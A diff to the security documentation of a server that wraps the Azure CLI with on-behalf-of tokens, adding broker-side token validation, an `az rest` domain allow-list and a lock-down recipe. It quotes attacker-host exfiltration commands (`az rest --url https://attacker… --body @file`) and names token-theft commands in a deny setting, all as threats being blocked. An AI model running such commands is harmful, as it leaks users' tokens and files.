@@ -218,25 +218,38 @@ This server runs the full Azure CLI as the signed-in user; treat it accordingly.
   `TasksMax`; the server caps **captured** bytes per command (`AZOBO_MAX_CAPTURE_BYTES`,
   killing the child if exceeded) and the total bytes retained in memory. A runaway can kill
   the *service*, not the host.
-- **Caller authorization.** Validate more than aud/iss/exp in a multi-client tenant:
-  `AZOBO_REQUIRED_SCOPE` (the token's `scp` must contain it, e.g. `user_impersonation`) and
-  `AZOBO_ALLOWED_CLIENTS` (allow-list of calling app IDs via `azp`/`appid`). Prefer
+- **Caller authorization, enforced at the broker.** The broker (the credential boundary)
+  validates each assertion itself at register — signature via JWKS, audience, issuer, plus
+  optional `AZOBO_REQUIRED_SCOPE` (token `scp`) and `AZOBO_ALLOWED_CLIENTS` (calling app's
+  `azp`/`appid`). The server validates too; the broker doesn't trust the caller. Prefer
   **admin-only consent / app assignment** on the resource app so a random client can't
   obtain a callable token in the first place.
+- **`az rest` is restricted to Microsoft/Azure endpoints, not denied.** An OBO token is only
+  valid at the Microsoft first-party service it's audienced to, so there is no legitimate
+  reason for `az rest`/`invoke` to target any other host — the `--url` host is checked
+  against `AZOBO_REST_ALLOWED_DOMAINS` (default: commercial Azure/Microsoft) and anything
+  else is refused. This keeps raw Graph/ARM working while killing
+  `rest --url https://attacker… --body @file` token/file exfil. (Residual: an attacker
+  controlling an Azure resource — their own `*.blob.core.windows.net` — is bounded and
+  traceable; close even that with an egress proxy allow-list.)
 - **Read-only by default.** The example env ships `AZOBO_READONLY=true` (Graph GET-only;
   refuses mutating `az` verbs incl. `rest`/`invoke` non-GET) — the dangerous default is the
   safe one. Set it `false` to allow writes (then per-user RBAC is the boundary). Note this is
   **defense-in-depth, not a hard boundary** — a best-effort blocklist, not a command
   allowlist. For a *real* read-only deployment, assign users only **Reader** RBAC + read-only
   consent; RBAC is authoritative.
-- **Egress / exfil control.** The unit blocks IMDS/link-local
-  (`IPAddressDeny=169.254.0.0/16 fe80::/10`) so `az rest`/SSRF can't lift the *host's*
-  managed-identity token. **That does not stop exfil to public endpoints** (`az rest --method
-  POST --url https://attacker …`). For less-trusted callers either set
-  `AZOBO_DENY_COMMANDS=rest,account get-access-token` (removes the rawest token/SSRF
-  primitives) and/or force outbound traffic through a **proxy/firewall allow-list of Azure
-  endpoints only**. ⚠️ `IPAddressDeny` needs cgroup/BPF — on some container hosts it silently
-  no-ops; verify with `systemctl show azobo-mcp -p IPAddressDeny`.
+- **Egress.** The unit blocks IMDS/link-local (`IPAddressDeny=169.254.0.0/16 fe80::/10`) so
+  `az rest`/SSRF can't lift the *host's* managed-identity token. ⚠️ `IPAddressDeny` needs
+  cgroup/BPF — on some container hosts it silently no-ops; verify with
+  `systemctl show azobo-mcp -p IPAddressDeny`. The `rest` domain allow-list (above) handles
+  outbound token exfil at the app layer; for an untrusted deployment, also force outbound
+  through a **proxy/firewall allow-list of Azure endpoints only**.
+
+> **Lock-it-down recipe (less-trusted callers):** `AZOBO_READONLY=true` +
+> `AZOBO_REQUIRED_SCOPE` + `AZOBO_ALLOWED_CLIENTS` set + keep the default `rest` domain
+> allow-list + `AZOBO_DENY_COMMANDS=account get-access-token` + an egress proxy allow-listing
+> only Azure endpoints. For trusted operators on-prem, the defaults (validate on, rest
+> domain-restricted) are reasonable; flip `READONLY=false` if they need writes.
 - The wrapped CLI runs with `AZURE_CORE_DISABLE_DYNAMIC_INSTALL=yes` (no extension code
   auto-runs) and a **minimal environment** (only the vars the wrapper needs).
 - **Token caching (no Entra hammering).** The broker's single long-lived MSAL client caches
